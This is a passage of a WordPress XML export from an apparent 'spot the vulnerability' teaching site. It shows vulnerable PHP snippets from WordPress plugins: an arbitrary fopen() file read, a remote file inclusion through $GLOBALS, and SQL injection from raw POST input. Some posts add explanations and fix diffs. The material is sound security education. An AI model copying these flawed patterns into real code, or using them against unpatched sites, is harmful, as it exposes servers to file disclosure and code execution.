		<wp:post_date_gmt>2010-04-23 15:00:00</wp:post_date_gmt>
		<wp:comment_status>open</wp:comment_status>
		<wp:ping_status>open</wp:ping_status>
		<wp:post_name>butterflies-sql-injection-xss</wp:post_name>
		<wp:status>publish</wp:status>
		<wp:post_parent>0</wp:post_parent>
		<wp:menu_order>0</wp:menu_order>
		<wp:post_type>post</wp:post_type>
		<wp:post_password></wp:post_password>
		<wp:is_sticky>0</wp:is_sticky>
		<category domain="category" nicename="xss"><![CDATA[Cross-Site Scripting (XSS)]]></category>
		<category domain="category" nicename="php"><![CDATA[PHP]]></category>
		<category domain="category" nicename="solution"><![CDATA[Solution]]></category>
		<category domain="category" nicename="sql-injection"><![CDATA[SQL Injection]]></category>
		<category domain="category" nicename="wordpress"><![CDATA[Wordpress]]></category>
		<wp:postmeta>
			<wp:meta_key>_sexybookmarks_shortUrl</wp:meta_key>
			<wp:meta_value><![CDATA[http://bit.ly/cqruBa]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>_sexybookmarks_permaHash</wp:meta_key>
			<wp:meta_value><![CDATA[960a56a0349a78cdf3d44bd84fcd1a52]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>aktt_notify_twitter</wp:meta_key>
			<wp:meta_value><![CDATA[yes]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>_aktt_hash_meta</wp:meta_key>
			<wp:meta_value><![CDATA[]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>_edit_last</wp:meta_key>
			<wp:meta_value><![CDATA[1]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>bfa_ata_body_title</wp:meta_key>
			<wp:meta_value><![CDATA[Butterflies - SQL Injection / XSS]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>bfa_ata_display_body_title</wp:meta_key>
			<wp:meta_value><![CDATA[]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>bfa_ata_body_title_multi</wp:meta_key>
			<wp:meta_value><![CDATA[Butterflies - SQL Injection / XSS]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>bfa_ata_meta_title</wp:meta_key>
			<wp:meta_value><![CDATA[]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>bfa_ata_meta_keywords</wp:meta_key>
			<wp:meta_value><![CDATA[]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>bfa_ata_meta_description</wp:meta_key>
			<wp:meta_value><![CDATA[]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>aktt_tweeted</wp:meta_key>
			<wp:meta_value><![CDATA[1]]></wp:meta_value>
		</wp:postmeta>
	</item>
	<item>
		<title>Opportunity</title>
		<link>http://spotthevuln.com/2010/04/opportunity/</link>
		<pubDate>Mon, 26 Apr 2010 15:00:23 +0000</pubDate>
		<dc:creator>bkrios</dc:creator>
		<guid isPermaLink="false">http://spotthevuln.com/?p=823</guid>
		<description></description>
		<content:encoded><![CDATA[<blockquote><strong>Entrepreneurs are simply those who understand that there is little difference between obstacle and opportunity and are able to turn both to their advantage</strong>
- Niccolo Machiavelli</blockquote>
[ccnLe_php]

&lt;?php

switch($db['type'])
{
   case 'mysql':
       $db_link = new MySQLdb($db['host'], $db['username'], $db['password'], false, $db['database']);
    break;
    case 'postgresql':
        $db_link = new PostgreSQL($db['host'], $db['username'], $db['password'], false, $db['database']);
    break;
}
unset($db);
 
// Set Header and cache expiration
$offset = 60 * 60 * 24 * 2; // 2 days to expiry date.
@ob_start("ob_gzhandler");
header("Expires: " . gmdate("D, d M Y H:i:s", time() + $offset) . " GMT");                                                                 
header('Cache-Control: ');
header('Pragma: ');
 
foreach ($_GET as $key=&gt;$value)
{
    $_GET[$key] = urldecode($value);
}
 
$raw_content = '(No content available)';
if (!empty($_GET['content']))
{
    $fp = @fopen(urldecode($_GET['content']),'r');
    if (is_resource($fp))
    {
        $raw_content = '';
        while(!feof($fp)) $raw_content .= fread($fp,4096); 
    }
}
 
// just a namespace
class iBeginShare
{
    function isValidEmail($email)
    {
        $email = trim($email);
        return (bool)preg_match("/^([a-z0-9\+_\-]+)(\.[a-z0-9\+_\-]+)*@([a-z0-9\-]+\.)+[a-z]{2,6}$/ix", $email);
    }
    function quoteSmart($value)
    {
        if (is_array($value))
        {
            foreach ($value as $key =&gt; $value2):
                $value[$key] = htmlspecialchars((string) trim($value2), ENT_QUOTES, 'UTF-8');
            endforeach;
            return $value;
        }
        else
        {
            return htmlspecialchars((string) trim($value), ENT_QUOTES, 'UTF-8');
        }
    }
[/ccnLe_php] ]]></content:encoded>
		<excerpt:encoded><![CDATA[]]></excerpt:encoded>
		<wp:post_id>823</wp:post_id>
		<wp:post_date>2010-04-26 08:00:23</wp:post_date>
		<wp:post_date_gmt>2010-04-26 15:00:23</wp:post_date_gmt>
		<wp:comment_status>open</wp:comment_status>
		<wp:ping_status>open</wp:ping_status>
		<wp:post_name>opportunity</wp:post_name>
		<wp:status>publish</wp:status>
		<wp:post_parent>0</wp:post_parent>
		<wp:menu_order>0</wp:menu_order>
		<wp:post_type>post</wp:post_type>
		<wp:post_password></wp:post_password>
		<wp:is_sticky>0</wp:is_sticky>
		<category domain="category" nicename="code-snippet"><![CDATA[Code Snippet]]></category>
		<wp:postmeta>
			<wp:meta_key>_sexybookmarks_shortUrl</wp:meta_key>
			<wp:meta_value><![CDATA[http://bit.ly/9iYxIc]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>_sexybookmarks_permaHash</wp:meta_key>
			<wp:meta_value><![CDATA[f4a2416b8ced67b4c85ea72311105d98]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>aktt_notify_twitter</wp:meta_key>
			<wp:meta_value><![CDATA[yes]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>_aktt_hash_meta</wp:meta_key>
			<wp:meta_value><![CDATA[]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>_edit_last</wp:meta_key>
			<wp:meta_value><![CDATA[2]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>bfa_ata_body_title</wp:meta_key>
			<wp:meta_value><![CDATA[]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>bfa_ata_display_body_title</wp:meta_key>
			<wp:meta_value><![CDATA[]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>bfa_ata_body_title_multi</wp:meta_key>
			<wp:meta_value><![CDATA[]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>bfa_ata_meta_title</wp:meta_key>
			<wp:meta_value><![CDATA[]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>bfa_ata_meta_keywords</wp:meta_key>
			<wp:meta_value><![CDATA[]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>bfa_ata_meta_description</wp:meta_key>
			<wp:meta_value><![CDATA[]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>aktt_tweeted</wp:meta_key>
			<wp:meta_value><![CDATA[1]]></wp:meta_value>
		</wp:postmeta>
		<wp:comment>
			<wp:comment_id>462</wp:comment_id>
			<wp:comment_author><![CDATA[Vulnerable Source Code &#8211; Opportunity &#8211; Code Execution ~ SpotTheVuln.com &laquo;SpotTheVuln.com]]></wp:comment_author>
			<wp:comment_author_email></wp:comment_author_email>
			<wp:comment_author_url>http://spotthevuln.com/2010/04/opportunity-code-execution/</wp:comment_author_url>
			<wp:comment_author_IP>97.74.49.242</wp:comment_author_IP>
			<wp:comment_date>2010-04-30 08:13:58</wp:comment_date>
			<wp:comment_date_gmt>2010-04-30 15:13:58</wp:comment_date_gmt>
			<wp:comment_content><![CDATA[[...] Opportunity [...] ]]></wp:comment_content>
			<wp:comment_approved>1</wp:comment_approved>
			<wp:comment_type>pingback</wp:comment_type>
			<wp:comment_parent>0</wp:comment_parent>
			<wp:comment_user_id>0</wp:comment_user_id>
		</wp:comment>
	</item>
	<item>
		<title>Opportunity - Code Execution</title>
		<link>http://spotthevuln.com/2010/04/opportunity-code-execution/</link>
		<pubDate>Fri, 30 Apr 2010 15:00:25 +0000</pubDate>
		<dc:creator>bkrios</dc:creator>
		<guid isPermaLink="false">http://spotthevuln.com/?p=825</guid>
		<description></description>
		<content:encoded><![CDATA[<h2>Details</h2>
Affected Software: WordPress Plugin iBegin Share

Fixed in Version: Rev 91762

Issue Type: Code Execution

Original Code: <a title="Opportunity" href="http://spotthevuln.com/2010/04/opportunity/" target="_blank">Found Here</a>
<h2>Description</h2>
<p class="MsoNormal" style="margin: 0in 0in 10pt;"><span style="font-family: Calibri; font-size: small;">In this specific example, we have a condition where the attacker has the ability to pass an arbitrary URL (with an arbitrary protocol handler) to the fopen() PHP API.<span style="mso-spacerun: yes;">  </span>By allowing the attacker to pass arbitrary URLs to the fopen() API, the developers have introduced an opportunity for several different types of exploits.<span style="mso-spacerun: yes;">  </span>Using this vulnerability, the attacker has the ability to fopen() any file on the local file system of the web server.<span style="mso-spacerun: yes;">  </span>Configuration and files holding sensitive information located on the web server would be a great target, especially if the contents of the files were eventually echoed back to the attacker.<span style="mso-spacerun: yes;">  </span>In addition to the information disclosure bug, some servers are configured to allow fopen() to actually execute PHP code as if it were an include.<span style="mso-spacerun: yes;">  </span>In addition to the information disclosure, this bug could also be used to pull of XSS and a variety of other exploits.</span></p>
<p class="MsoNormal" style="margin: 0in 0in 10pt;"><span style="font-family: Calibri; font-size: small;">The iBegin Share developers addressed the issue by forcing the URL provided to have the “HTTP/HTTPS” prefix…<span style="mso-spacerun: yes;">  </span>I wonder if this strategy is robust against the code execution attack</span>.</p>

<h2>Developers Solution</h2>
[cce lang="diff"]
<div id="_mcePaste">

switch($db['type'])
{
   case 'mysql':
       $db_link = new MySQLdb($db['host'], $db['username'], $db['password'], false, $db['database']);
    break;
    case 'postgresql':
        $db_link = new PostgreSQL($db['host'], $db['username'], $db['password'], false, $db['database']);
    break;
}
unset($db);
 
// Set Header and cache expiration
$offset = 60 * 60 * 24 * 2; // 2 days to expiry date.
@ob_start("ob_gzhandler");
header("Expires: " . gmdate("D, d M Y H:i:s", time() + $offset) . " GMT");                                                                 
header('Cache-Control: ');
header('Pragma: ');
 
foreach ($_GET as $key=&gt;$value)
{
    $_GET[$key] = urldecode($value);
}
 
$raw_content = '(No content available)';
if (!empty($_GET['content']))
{
-   $fp = @fopen(urldecode($_GET['content']),'r'); 
-   if (is_resource($fp)) 
+   $content = urldecode($_GET['content']); 
+   if (preg_match('/^https?\:/', $content)) 

    {
        $fp = @fopen($content,'r');
        if (is_resource($fp))
        {
-           $raw_content = '';
-           while(!feof($fp)) $raw_content .= fread($fp,4096); 
+           $fp = @fopen($content,'r'); 
+           if (is_resource($fp)) 
+           { 
+             $raw_content = ''; 
+             while(!feof($fp)) $raw_content .= fread($fp,4096);  
+           } 

        }
    }
}
 
// just a namespace
class iBeginShare
{
    function isValidEmail($email)
    {
        $email = trim($email);
        return (bool)preg_match("/^([a-z0-9\+_\-]+)(\.[a-z0-9\+_\-]+)*@([a-z0-9\-]+\.)+[a-z]{2,6}$/ix", $email);
    }
    function quoteSmart($value)
    {
        if (is_array($value))
        {
            foreach ($value as $key =&gt; $value2):
                $value[$key] = htmlspecialchars((string) trim($value2), ENT_QUOTES, 'UTF-8');
            endforeach;
            return $value;
        }
        else
         {
            return htmlspecialchars((string) trim($value), ENT_QUOTES, 'UTF-8');
        }
    }

</div>
[/cce] ]]></content:encoded>
		<excerpt:encoded><![CDATA[]]></excerpt:encoded>
		<wp:post_id>825</wp:post_id>
		<wp:post_date>2010-04-30 08:00:25</wp:post_date>
		<wp:post_date_gmt>2010-04-30 15:00:25</wp:post_date_gmt>
		<wp:comment_status>open</wp:comment_status>
		<wp:ping_status>open</wp:ping_status>
		<wp:post_name>opportunity-code-execution</wp:post_name>
		<wp:status>publish</wp:status>
		<wp:post_parent>0</wp:post_parent>
		<wp:menu_order>0</wp:menu_order>
		<wp:post_type>post</wp:post_type>
		<wp:post_password></wp:post_password>
		<wp:is_sticky>0</wp:is_sticky>
		<category domain="category" nicename="code-snippet"><![CDATA[Code Snippet]]></category>
		<wp:postmeta>
			<wp:meta_key>aktt_notify_twitter</wp:meta_key>
			<wp:meta_value><![CDATA[yes]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>_aktt_hash_meta</wp:meta_key>
			<wp:meta_value><![CDATA[]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>_edit_last</wp:meta_key>
			<wp:meta_value><![CDATA[2]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>bfa_ata_body_title</wp:meta_key>
			<wp:meta_value><![CDATA[]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>bfa_ata_display_body_title</wp:meta_key>
			<wp:meta_value><![CDATA[]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>bfa_ata_body_title_multi</wp:meta_key>
			<wp:meta_value><![CDATA[]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>bfa_ata_meta_title</wp:meta_key>
			<wp:meta_value><![CDATA[]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>bfa_ata_meta_keywords</wp:meta_key>
			<wp:meta_value><![CDATA[]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>bfa_ata_meta_description</wp:meta_key>
			<wp:meta_value><![CDATA[]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>aktt_tweeted</wp:meta_key>
			<wp:meta_value><![CDATA[1]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>_sexybookmarks_shortUrl</wp:meta_key>
			<wp:meta_value><![CDATA[http://bit.ly/cn8cWW]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>_sexybookmarks_permaHash</wp:meta_key>
			<wp:meta_value><![CDATA[627b72201a3c7fd7b3ae8ac5c02c1acc]]></wp:meta_value>
		</wp:postmeta>
	</item>
	<item>
		<title>Theory</title>
		<link>http://spotthevuln.com/2010/05/theory/</link>
		<pubDate>Mon, 03 May 2010 15:00:14 +0000</pubDate>
		<dc:creator>bkrios</dc:creator>
		<guid isPermaLink="false">http://spotthevuln.com/?p=828</guid>
		<description></description>
		<content:encoded><![CDATA[<blockquote><strong>In theory, there is no difference between theory and practice.  But, in practice, there is.</strong>
- van de Snepscheut</blockquote>
[ccnLe_php]

&lt;?php

require_once $GLOBALS['bkpwp_plugin_path']."Archive/Predicate.php";
require_once "MIME/Type.php";

/**
 * Keep only the files that have a specific MIME type
 *
 * @see        File_Archive_Predicate, File_Archive_Reader_Filter
 */
class File_Archive_Predicate_MIME extends File_Archive_Predicate
{
    var $mimes;

    /**
     * @param $extensions array or comma separated string of allowed extensions
     */
    function File_Archive_Predicate_MIME($mimes)
    {
        if (is_string($mimes)) {
            $this-&gt;mimes = explode(",",$mimes);
        } else {
            $this-&gt;mimes = $mimes;
        }
    }
    /**
     * @see File_Archive_Predicate::isTrue()
     */
    function isTrue(&amp;$source)
    {
        $sourceMIME = $source-&gt;getMIME();
        foreach ($this-&gt;mimes as $mime) {
            if (MIME_Type::isWildcard($mime)) {
                $result = MIME_Type::wildcardMatch($mime, $sourceMIME);
            } else {
                $result = ($mime == $sourceMIME);
            }
            if ($result !== false) {
                return $result;
            }
        }
        return false;
    }
}

?&gt;

[/ccnLe_php] ]]></content:encoded>
		<excerpt:encoded><![CDATA[]]></excerpt:encoded>
		<wp:post_id>828</wp:post_id>
		<wp:post_date>2010-05-03 08:00:14</wp:post_date>
		<wp:post_date_gmt>2010-05-03 15:00:14</wp:post_date_gmt>
		<wp:comment_status>open</wp:comment_status>
		<wp:ping_status>open</wp:ping_status>
		<wp:post_name>theory</wp:post_name>
		<wp:status>publish</wp:status>
		<wp:post_parent>0</wp:post_parent>
		<wp:menu_order>0</wp:menu_order>
		<wp:post_type>post</wp:post_type>
		<wp:post_password></wp:post_password>
		<wp:is_sticky>0</wp:is_sticky>
		<category domain="category" nicename="code-snippet"><![CDATA[Code Snippet]]></category>
		<wp:postmeta>
			<wp:meta_key>_sexybookmarks_shortUrl</wp:meta_key>
			<wp:meta_value><![CDATA[http://bit.ly/dgBRdY]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>_sexybookmarks_permaHash</wp:meta_key>
			<wp:meta_value><![CDATA[9b37cdc3310b6771823f01d5b3ab9a66]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>aktt_notify_twitter</wp:meta_key>
			<wp:meta_value><![CDATA[yes]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>_aktt_hash_meta</wp:meta_key>
			<wp:meta_value><![CDATA[]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>_edit_last</wp:meta_key>
			<wp:meta_value><![CDATA[2]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>bfa_ata_body_title</wp:meta_key>
			<wp:meta_value><![CDATA[]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>bfa_ata_display_body_title</wp:meta_key>
			<wp:meta_value><![CDATA[]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>bfa_ata_body_title_multi</wp:meta_key>
			<wp:meta_value><![CDATA[]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>bfa_ata_meta_title</wp:meta_key>
			<wp:meta_value><![CDATA[]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>bfa_ata_meta_keywords</wp:meta_key>
			<wp:meta_value><![CDATA[]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>bfa_ata_meta_description</wp:meta_key>
			<wp:meta_value><![CDATA[]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>aktt_tweeted</wp:meta_key>
			<wp:meta_value><![CDATA[1]]></wp:meta_value>
		</wp:postmeta>
		<wp:comment>
			<wp:comment_id>466</wp:comment_id>
			<wp:comment_author><![CDATA[Vulnerable Source Code &#8211; Theory &#8211; Code Execution ~ SpotTheVuln.com &laquo;SpotTheVuln.com]]></wp:comment_author>
			<wp:comment_author_email></wp:comment_author_email>
			<wp:comment_author_url>http://spotthevuln.com/2010/05/theory-code-execution/</wp:comment_author_url>
			<wp:comment_author_IP>97.74.49.242</wp:comment_author_IP>
			<wp:comment_date>2010-05-07 08:28:56</wp:comment_date>
			<wp:comment_date_gmt>2010-05-07 15:28:56</wp:comment_date_gmt>
			<wp:comment_content><![CDATA[[...] Theory [...] ]]></wp:comment_content>
			<wp:comment_approved>1</wp:comment_approved>
			<wp:comment_type>pingback</wp:comment_type>
			<wp:comment_parent>0</wp:comment_parent>
			<wp:comment_user_id>0</wp:comment_user_id>
		</wp:comment>
	</item>
	<item>
		<title>Theory – Code Execution</title>
		<link>http://spotthevuln.com/2010/05/theory-code-execution/</link>
		<pubDate>Fri, 07 May 2010 15:00:14 +0000</pubDate>
		<dc:creator>BrettH</dc:creator>
		<guid isPermaLink="false">http://spotthevuln.com/?p=831</guid>
		<description></description>
		<content:encoded><![CDATA[<h2>Details</h2>
Affected Software: BackupWordPress

Fixed in Version: 0.4.3

Issue Type: Code Execution

Original Code: <a title="Theory" href="http://spotthevuln.com/2010/05/theory/" target="_blank">Found Here</a>
<h2>Description</h2>
This particular bug was a remote file inclusion vulnerability in a WordPress plugin known as BackupWordPress. This particular vulnerability was actually publically disclosed on Milworm by the “Xmors Underground Team” (http://www.milw0rm.com/exploits/4593). The vulnerability, combined with the register_globals behavior in older versions of PHP allowed attackers to simply provide the “$GLOBALS['bkpwp_plugin_path']” via the URL in a GET request, supplying an attacker controlled location for the include.

The developers fixed this particular vulnerability by removing the $GLOBALS from the source.
<h2>Developers Solution</h2>
[cce lang="diff"]

&lt;?php

-require_once $GLOBALS['bkpwp_plugin_path']."Archive/Predicate.php";
+require_once BKPWP_PLUGIN_PATH."Archive/Predicate.php";
require_once "MIME/Type.php";

/**
 * Keep only the files that have a specific MIME type
 *
 * @see        File_Archive_Predicate, File_Archive_Reader_Filter
 */
class File_Archive_Predicate_MIME extends File_Archive_Predicate
{
    var $mimes;

    /**
     * @param $extensions array or comma separated string of allowed extensions
     */
    function File_Archive_Predicate_MIME($mimes)
    {
        if (is_string($mimes)) {
            $this-&gt;mimes = explode(",",$mimes);
        } else {
            $this-&gt;mimes = $mimes;
        }
    }
    /**
     * @see File_Archive_Predicate::isTrue()
     */
    function isTrue(&amp;$source)
    {
        $sourceMIME = $source-&gt;getMIME();
        foreach ($this-&gt;mimes as $mime) {
            if (MIME_Type::isWildcard($mime)) {
                $result = MIME_Type::wildcardMatch($mime, $sourceMIME);
            } else {
                $result = ($mime == $sourceMIME);
            }
            if ($result !== false) {
                return $result;
            }
        }
        return false;
    }
}

?&gt;

[/cce] ]]></content:encoded>
		<excerpt:encoded><![CDATA[]]></excerpt:encoded>
		<wp:post_id>831</wp:post_id>
		<wp:post_date>2010-05-07 08:00:14</wp:post_date>
		<wp:post_date_gmt>2010-05-07 15:00:14</wp:post_date_gmt>
		<wp:comment_status>open</wp:comment_status>
		<wp:ping_status>open</wp:ping_status>
		<wp:post_name>theory-code-execution</wp:post_name>
		<wp:status>publish</wp:status>
		<wp:post_parent>0</wp:post_parent>
		<wp:menu_order>0</wp:menu_order>
		<wp:post_type>post</wp:post_type>
		<wp:post_password></wp:post_password>
		<wp:is_sticky>0</wp:is_sticky>
		<category domain="post_tag" nicename="backup"><![CDATA[backup]]></category>
		<category domain="category" nicename="file-inclusion"><![CDATA[File Inclusion]]></category>
		<category domain="post_tag" nicename="file-inclusion"><![CDATA[File Inclusion]]></category>
		<category domain="post_tag" nicename="globals"><![CDATA[globals]]></category>
		<category domain="category" nicename="php"><![CDATA[PHP]]></category>
		<category domain="post_tag" nicename="php"><![CDATA[PHP]]></category>
		<category domain="post_tag" nicename="plugin"><![CDATA[plugin]]></category>
		<category domain="post_tag" nicename="register_globals"><![CDATA[register_globals]]></category>
		<category domain="category" nicename="solution"><![CDATA[Solution]]></category>
		<category domain="category" nicename="wordpress"><![CDATA[Wordpress]]></category>
		<category domain="post_tag" nicename="wordpress"><![CDATA[Wordpress]]></category>
		<wp:postmeta>
			<wp:meta_key>aktt_notify_twitter</wp:meta_key>
			<wp:meta_value><![CDATA[yes]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>_aktt_hash_meta</wp:meta_key>
			<wp:meta_value><![CDATA[]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>_edit_last</wp:meta_key>
			<wp:meta_value><![CDATA[1]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>bfa_ata_body_title</wp:meta_key>
			<wp:meta_value><![CDATA[]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>bfa_ata_display_body_title</wp:meta_key>
			<wp:meta_value><![CDATA[]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>bfa_ata_body_title_multi</wp:meta_key>
			<wp:meta_value><![CDATA[]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>bfa_ata_meta_title</wp:meta_key>
			<wp:meta_value><![CDATA[]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>bfa_ata_meta_keywords</wp:meta_key>
			<wp:meta_value><![CDATA[]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>bfa_ata_meta_description</wp:meta_key>
			<wp:meta_value><![CDATA[]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>_sexybookmarks_shortUrl</wp:meta_key>
			<wp:meta_value><![CDATA[http://bit.ly/aw0WFE]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>_sexybookmarks_permaHash</wp:meta_key>
			<wp:meta_value><![CDATA[2a89eb8f1990ef85157c572634a3db47]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>aktt_tweeted</wp:meta_key>
			<wp:meta_value><![CDATA[1]]></wp:meta_value>
		</wp:postmeta>
		<wp:comment>
			<wp:comment_id>1869</wp:comment_id>
			<wp:comment_author><![CDATA[Focusing On What Your Good At &laquo; Miscellaneous Security]]></wp:comment_author>
			<wp:comment_author_email></wp:comment_author_email>
			<wp:comment_author_url>http://misc-security.com/blog/2011/04/focusing-on-what-your-good-at/</wp:comment_author_url>
			<wp:comment_author_IP>97.74.144.123</wp:comment_author_IP>
			<wp:comment_date>2011-04-01 13:40:24</wp:comment_date>
			<wp:comment_date_gmt>2011-04-01 20:40:24</wp:comment_date_gmt>
			<wp:comment_content><![CDATA[[...] Comments need to be approved. So, even if this XSS was valid I would personally have to share it with my readers. In doing your homework, realize that other bugs, such as remote code execution, are WAY better. Look for those. [...] ]]></wp:comment_content>
			<wp:comment_approved>1</wp:comment_approved>
			<wp:comment_type>pingback</wp:comment_type>
			<wp:comment_parent>0</wp:comment_parent>
			<wp:comment_user_id>0</wp:comment_user_id>
			<wp:commentmeta>
				<wp:meta_key>akismet_history</wp:meta_key>
				<wp:meta_value><![CDATA[a:4:{s:4:"time";s:15:"1301806984.6267";s:7:"message";s:45:"bkrios changed the comment status to approved";s:5:"event";s:15:"status-approved";s:4:"user";s:6:"bkrios";}]]></wp:meta_value>
			</wp:commentmeta>
			<wp:commentmeta>
				<wp:meta_key>akismet_result</wp:meta_key>
				<wp:meta_value><![CDATA[false]]></wp:meta_value>
			</wp:commentmeta>
			<wp:commentmeta>
				<wp:meta_key>akismet_history</wp:meta_key>
				<wp:meta_value><![CDATA[a:4:{s:4:"time";s:15:"1301690424.1548";s:7:"message";s:28:"Akismet cleared this comment";s:5:"event";s:9:"check-ham";s:4:"user";s:0:"";}]]></wp:meta_value>
			</wp:commentmeta>
		</wp:comment>
	</item>
	<item>
		<title>Pictures</title>
		<link>http://spotthevuln.com/2010/05/pictures/</link>
		<pubDate>Mon, 10 May 2010 15:00:45 +0000</pubDate>
		<dc:creator>bkrios</dc:creator>
		<guid isPermaLink="false">http://spotthevuln.com/?p=835</guid>
		<description></description>
		<content:encoded><![CDATA[<blockquote><strong>It's a little weird exchanging pictures for money. You know what I mean. It makes me a little uncomfortable.</strong>
- Noah Hathaway</blockquote>
[ccnLe_php]

&lt;?php
require_once(ABSPATH . 'wp-admin/upgrade-functions.php');
   dbDelta($sql);
  
   }
   if(isset($_POST['action'])) {
      $action = $_POST['action'];

if($action == "create"){
   $add_url = $_POST['form_url'];
   $add_desc = $_POST['form_desc'];
   if($add_url == "http://" || (!$add_url)){ $ERR = $ERR . "&lt;br&gt;You must enter a URL to redirect to!"; }
   if(!$ERR){
      $wpdb-&gt;query("INSERT INTO $table_name (link_url,link_desc) VALUES ('$add_url','$add_desc')");
         $new_url = get_option("siteurl") . "/u/" . mysql_insert_id();
         $MES = $MES . "&lt;br&gt;The redirect URL has been added. Your new Short URL is: " . $new_url;
         }
      }

if($action == "edit"){
   $edit_id = $_POST['id'];
   $edit_url = $_POST['form_url'];
   $edit_desc = $_POST['form_desc'];
   if($edit_url == "http://" || (!$edit_url)){ $ERR = $ERR . "&lt;br&gt;You must enter a URL to redirect to!"; }
   if(!$ERR){
      $wpdb-&gt;query("UPDATE $table_name SET link_url='$edit_url',link_desc='$edit_desc' WHERE link_id = $edit_id");
         $MES = $MES . "&lt;br&gt;The redirect URL has been modified.";
         }
      }

  
if($action == "delete"){
   $delete_id = $_POST['id'];
   $wpdb-&gt;query("DELETE FROM $table_name WHERE link_id = '$delete_id'");
   $MES = $MES . "&lt;br&gt;Redirect deleted!";
   }
  
if($action == "clearall"){
        $wpdb-&gt;query("UPDATE $table_name SET link_count='0' WHERE link_count &gt; 0");
   $MES = $MES . "&lt;br&gt;Counts have been reset!";
   }
}
   ?&gt;
   &lt;div&gt;
   &lt;form method="post"&gt;
      &lt;h2&gt;Short URL Admin&lt;/h2&gt;
&lt;?php if($ERR){ echo "&lt;p&gt;" . $ERR . "&lt;/p&gt;"; }
if($MES){ echo "&lt;p&gt;" . $MES . "&lt;/p&gt;"; } ?&gt;
      &lt;p&gt;Short URL allows you to create shorter URL's and keeps track of how many
times a link has been clicked. It's useful for managing downloads, keeping track
of outbound links and for masking URL's. Clicking the Clear All Clicks button
will reset the count for each entry. Visit the &lt;a href="<a href="http://www.harleyquine.com/php-scripts/short-url-plugin/%22%3Eplugin">http://www.harleyquine.com/php-scripts/short-url-plugin/"&gt;plugin</a> page&lt;/a&gt; for more information about this plugin.&lt;/p&gt;

&lt;h2&gt;Current Redirects&lt;/h2&gt;
&lt;table&gt;
   &lt;thead&gt;
   &lt;tr&gt;
   &lt;th scope="col"&gt;Short URL (The URL to use)&lt;/th&gt;
   &lt;th scope="col"&gt;Real URL (Where it redirects to)&lt;/th&gt;
   &lt;th scope="col"&gt;Notes&lt;/th&gt;
